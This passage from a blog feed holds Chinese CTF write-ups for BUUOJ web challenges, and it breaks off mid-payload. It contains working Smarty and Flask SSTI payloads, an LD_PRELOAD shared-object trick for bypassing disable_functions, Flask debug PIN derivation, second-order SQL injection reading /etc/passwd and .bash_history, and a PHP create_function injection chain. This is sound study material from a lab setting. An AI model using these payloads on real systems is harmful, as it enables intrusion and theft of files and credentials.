ssti</code>，右上角显示了<code>IP</code>，猜测注入点应该再<code>X-Forwarded-For</code>3.1.30</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319235007674.png" alt></p><ol start="2"><li>设置<code>X-Forwarded-For</code>为<code>{7+7}</code>，在<code>current ip</code> 处回显<code>14</code>，确实在这里存在<code>ssti</code></li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;&#123;7+7&#125;&#125;&quot;   &#x2F;&#x2F;返回14</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;$smarty.version&#125;&quot;   &#x2F;&#x2F;返回3.1.30</span><br><span class="line"></span><br><span class="line">使用if标签执行命令</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;&quot;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p></blockquote><h3 id="0x-03-Wallbreaker-Easy"><a href="#0x-03-Wallbreaker-Easy" class="headerlink" title="0x 03 Wallbreaker_Easy"></a>0x 03 Wallbreaker_Easy</h3><ul><li><p>考点</p><p>disable_function bypass</p></li><li><p>解题过程</p></li></ul><ol><li>攻击思路</li></ol><p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行。</p><ol start="2"><li>编写hack.c</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;8810490ee01835952ff9359d77cce4bd&#x2F;lxj.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件</p><p>获取so文件的base64值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,base64_encode(file_get_contents(<span class="string">'P3rh4ps.so'</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件并执行</p><p>一打就崩。。。。</p><p>参考资料：</p><blockquote><p><a href="https://p3rh4ps.top/index.php/2020/01/12/20-1-12-总结/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/01/12/20-1-12-%E6%80%BB%E7%BB%93/</a></p><p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD劫持类型题目/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</a></p><p><a href="https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-web刷题（一）</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-CISCN2019-华东南赛区-Double-Secret"><a href="#0x-01-CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="0x 01 [CISCN2019 华东南赛区]Double Secret"></a>0x 01 [CISCN2019 华东南赛区]Double Secret</h3><ul><li>考点</li></ul><p>ssti、Flask debug pin安全问题                </p><ul><li>解题过程</li></ul><p>超过四位的字符加密会报错, 报错信息中可以看到部分源码</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222846945.png" alt></p><p>将要加密的东西换成%ff, 又爆出了源码</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222934076.png" alt></p><p>解法一：</p><p>ssti读取flag文件</p><p>利用工具CyberChef或者使用脚本加密</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225621819.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key &#x3D; key</span><br><span class="line">        self.key_length &#x3D; len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box &#x3D; [i for i in range(256)]</span><br><span class="line">        k &#x3D; [self.key[i % self.key_length] for i in range(256)]</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        for i in range(256):</span><br><span class="line">            j &#x3D; (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        result &#x3D; &#39;&#39;</span><br><span class="line">        for ch in plaintext:</span><br><span class="line">            i &#x3D; (i + 1) % 256</span><br><span class="line">            j &#x3D; (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line">            t &#x3D; (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result +&#x3D; chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">a &#x3D; RC4(&#39;HereIsTreasure&#39;)</span><br><span class="line">cmd &#x3D; &quot;&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#39;&#x2F;flag.txt&#39;).read() &#125;&#125;&quot;</span><br><span class="line">payload &#x3D; urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res &#x3D; requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>解法二：</p><p>Flask debug pin安全问题执行shell</p><p>参考：<a href="https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg</a></p><ul><li>生成pin码必要文件：<ul><li>username #用户名，可以查看/etc/passwd或者读取/proc/self/environ环境变量</li><li>modename #flask.app</li><li>getattr(app,’<strong>name</strong>‘,getattr(app.<strong>class</strong>,’<strong>name</strong>‘)) # Flask</li><li>getattr(mod,’<strong>file</strong>‘,None) #app.py的绝对路径</li><li>uuid.getnode() #mac地址十进制</li><li>get_machine_id() #docker环境下读取/proc/self/cgroup 其余依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件</li></ul></li></ul><p>依次需要获取6个变量，首先是用户名，我采用的办法是读取/proc/self/environ环境变量的办法，加密生成读取文件的payload：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225842982.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225820453.png" alt>可见username的值为glzjin</p><p>然后是modname，依然为flask.app</p><p>第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>依然为Flask</p><p>第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>要注意，服务器上python2的安装路径和我们本地的可不太一样，这可以从报错猜测这个值应该为<code>/usr/local/lib/python2.7/site-packages/flask/app.pyc</code></p><p>随后是str(uuid.getnode())的值，读取服务器的/sys/class/net/eth0/address文件，其结果为：<code>02:42:ae:00:9e:fc</code>,写一个脚本转换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*-coding:utf8-*-</span><br><span class="line">machex &#x3D; &quot;0x&quot;+&quot;02:42:ae:00:9e:fc&quot;.replace(&#39;:&#39;,&#39;&#39;)</span><br><span class="line">print int(machex,16)</span><br><span class="line">### output</span><br><span class="line">2485410373372</span><br></pre></td></tr></table></figure><p>首先尝试打开/proc/self/cgroup文件，读取第一行，并将/docker/字符串后面的内容作为该函数的返回值，如果该文件不存在或者该值不存在，才会走入师傅们文章中提到的依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件的流程</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230454251.png" alt></p><p>那么它的get_machine_id()的返回值就应该是第一行/docker/后面的那部分，即</p><p>a8832ad13feb717ec6ae4c2f4a79b79b64c63329bd5497b7ab3f1b055860e5b8</p><p>至此，所有参数获取完毕，输入payload计算pin码：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230746497.png" alt></p><p>在报错页面中输入pin码，成功打开python shell,剩下就是读取flag了</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230827937.png" alt></p><p>参考资料：</p><blockquote><p> 从一道ctf题谈谈flask开启debug模式存在的安全问题 </p><p><a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p><p><a href="https://eustiar.com/archives/576" target="_blank" rel="noopener">https://eustiar.com/archives/576</a></p><p><a href="https://ch4ser-go.github.io/2019/05/27/SSTI/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/05/27/SSTI/</a></p></blockquote><h3 id="0x-02-网鼎杯-2018-Comment"><a href="#0x-02-网鼎杯-2018-Comment" class="headerlink" title="0x 02 [网鼎杯 2018]Comment"></a>0x 02 [网鼎杯 2018]Comment</h3><ul><li>考点</li></ul><p>git泄露、SQL二次注入</p><ul><li>解题过程</li></ul><ol><li>控制台提示存在git泄露，使用GitHack泄露代码得到</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213104847569.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后发现可以构成二次注入,思路是这样的:</p><p>观察了一下发现是两张表 board 、comment</p><p>首先写评论的时候数据写到board  然后再次评论的时候  category这个变量会从 board<br> 表中读取然后构成二次注入</p><p>如下图：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180830132920-a53543fe-ac15-1.png" alt="img"></p><p> 发帖后302到登录页面，爆破得知密码是zhangwei666</p><p>登录以后，进行发帖。开始构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>这里是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105247233.png" alt></p><p>然后再在评论里 */#</p><p>则拼接后的sql语句就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;123&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">                content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*&#39;,</span><br><span class="line">       content &#x3D; &#39;*&#x2F;#&#39;,</span><br></pre></td></tr></table></figure><p>被注释了，语句仍然是正常的sql语句。</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105426900.png" alt></p><p>看history文件</p><p>首先常规的读文件payload:123’,content=(select( load_file(‘/etc/passwd’))),/*</p><p>看到www用户的目录：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105627505.png" alt></p><p>发现一个www用户,看看用户的命令记录</p><p><code>123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213120311956.png" alt></p><blockquote><p>先在/tmp目录下解压压缩包</p><p>然后删除压缩包</p><p>再将html目录复制到/var/www/目录下</p><p>切换到/var/www/html，然后删除.DS_Store</p><p>但是并没有删除/tmp/html 目录下的，所以我们可以读取此文件~~</p></blockquote><p> 在/tmp/html下有个.DS_Store文件，用hex编码显示</p><p>payload: ‘, content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</p><p>解密一下</p><p><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a></p><p>发现文件名<code>flag_8946e1ff1ee3e40f.php</code><br> payload：<code>123&#39;, content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213121254435.png" alt></p><blockquote><p>参考资料</p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://xz.aliyun.com/t/2667#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2667#toc-1</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11649255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Tkitn/p/11649255.html</a></p></blockquote><h3 id="0x-03-BJDCTF2020-EzPHP"><a href="#0x-03-BJDCTF2020-EzPHP" class="headerlink" title="0x 03 [BJDCTF2020]EzPHP"></a>0x 03 [BJDCTF2020]EzPHP</h3><p>主页源代码处发现<code>GFXEIM3YFZYGQ4A=</code>，base32解密后得到1nD3x.php，访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure><ul><li>考点一：绕过QUERY_STRING的正则匹配</li></ul><p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行URLDecode，而<code>$_GET[]</code>会，所以只要进行url编码即可绕过</p><ul><li><p>考点二：绕过debu的正则匹配</p><p>可以使用<code>%0a</code>换行污染绕过</p></li><li><p>考点三：绕过$_REQUEST的字母匹配</p></li></ul><p><code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值，因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过</p><ul><li>考点4：绕过文件内容读取的比较</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;data:text&#x2F;plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><ul><li><p>考点5：绕过sha1比较</p><p>数组绕过即可</p></li><li><p>考点6：create_function()代码注入</p></li><li><p>考点7：获得flag</p></li></ul><p>综上payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">%64%65%62%75&#x3D;1&amp;file&#x3D;1</span><br><span class="line"></span><br><span class="line">url解码后：</span><br><span class="line">&#x2F;1nD3x.php?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>得到回显：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213180730536.png" alt></p><p>取反绕过+伪协议读源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST 